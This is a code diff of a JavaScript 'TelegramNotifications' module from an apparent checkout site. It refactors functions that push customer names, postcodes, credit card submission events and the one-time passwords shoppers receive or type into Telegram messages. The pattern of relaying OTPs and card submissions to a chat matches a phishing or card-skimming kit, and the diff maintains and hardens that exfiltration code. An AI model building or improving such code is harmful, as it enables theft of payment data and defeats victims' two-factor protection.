@@ -39,23 +39,31 @@ function getUSDEquivalent(localAmount, country) {
         dominican: { rate: 58 },
         usa: { rate: 1 }
     };
-    
+
     const countryConfig = config[country] || { rate: 1 };
     if (countryConfig.rate === 1) return localAmount;
-    
-    // Extract numeric value from local amount
+
+    // Extract numeric value from local amount (e.g., "$123.45")
     const numericValue = parseFloat(localAmount.replace(/[^\d.]/g, ''));
+    if (isNaN(numericValue)) return localAmount; // fallback if parsing fails
+
     const usdValue = numericValue / countryConfig.rate;
     return `$${usdValue.toFixed(2)} USD`;
 }
 
-// Notification functions for different events
+// Helper function to get country from localStorage or default
+function getCurrentCountry() {
+    if (typeof localStorage !== 'undefined') {
+        return localStorage.getItem('selectedCountry') || 'honduras';
+    }
+    return 'honduras'; // fallback default
+}
+
 const TelegramNotifications = {
-    // Credit card checkout
     proceedToCheckoutCard: async (orderData) => {
-        const currentCountry = localStorage.getItem('selectedCountry') || 'honduras';
+        const currentCountry = getCurrentCountry();
         const usdEquivalent = getUSDEquivalent(orderData.total, currentCountry);
-        
+
         const message = `
 🛒 <b>New Checkout Started (Credit Card)</b>
 
@@ -67,30 +75,27 @@ const TelegramNotifications = {
 
 <i>Customer is now on the payment page</i>`;
         await sendTelegramNotification(message);
+    },
 
-// Customer info notification
-sendCustomerInfo: async () => {
-    const name = localStorage.getItem('customerName') || 'Not provided';
-    const postcode = localStorage.getItem('customerPostcode') || 'Not provided';
+    sendCustomerInfo: async () => {
+        const name = (typeof localStorage !== 'undefined') ? localStorage.getItem('customerName') || 'Not provided' : 'Not provided';
+        const postcode = (typeof localStorage !== 'undefined') ? localStorage.getItem('customerPostcode') || 'Not provided' : 'Not provided';
 
-    const message = `
+        const message = `
 🧾 <b>Customer Information</b>
 
 👤 Name: ${name}
 📮 Postcode: ${postcode}
 ⏰ Submitted at: ${new Date().toLocaleString()}
-    `;
+        `;
 
-    await sendTelegramNotification(message);
-}
-
+        await sendTelegramNotification(message);
     },
 
-    // Bank transfer confirmation
     confirmBankTransfer: async (orderData) => {
-        const currentCountry = localStorage.getItem('selectedCountry') || 'honduras';
+        const currentCountry = getCurrentCountry();
         const usdEquivalent = getUSDEquivalent(orderData.total, currentCountry);
-        
+
         const message = `
 💳 <b>Bank Transfer Confirmed</b>
 
@@ -105,7 +110,6 @@ sendCustomerInfo: async () => {
         await sendTelegramNotification(message);
     },
 
-    // OTP notification
     notifyOTP: async (otp) => {
         const message = `
 🔐 <b>OTP Received</b>
@@ -115,11 +119,10 @@ sendCustomerInfo: async () => {
         await sendTelegramNotification(message);
     },
 
-    // Card details submitted
     cardDetailsSubmitted: async (orderData) => {
-        const currentCountry = localStorage.getItem('selectedCountry') || 'honduras';
+        const currentCountry = getCurrentCountry();
         const usdEquivalent = getUSDEquivalent(orderData.total, currentCountry);
-        
+
         const message = `
 💳 <b>Credit Card Details Submitted</b>
 
@@ -136,10 +139,9 @@ sendCustomerInfo: async () => {
         await sendTelegramNotification(message);
     },
 
-    // User entered OTP for verification
     userEnteredOTP: async (otp) => {
-        const currentCountry = localStorage.getItem('selectedCountry') || 'honduras';
-        
+        const currentCountry = getCurrentCountry();
+
         const message = `
 🔐 <b>User Entered OTP for Verification</b>
 
@@ -158,3 +160,4 @@ if (typeof module !== 'undefined' && module.exports) {
 } else {
     window.TelegramNotifications = TelegramNotifications;
 }
+
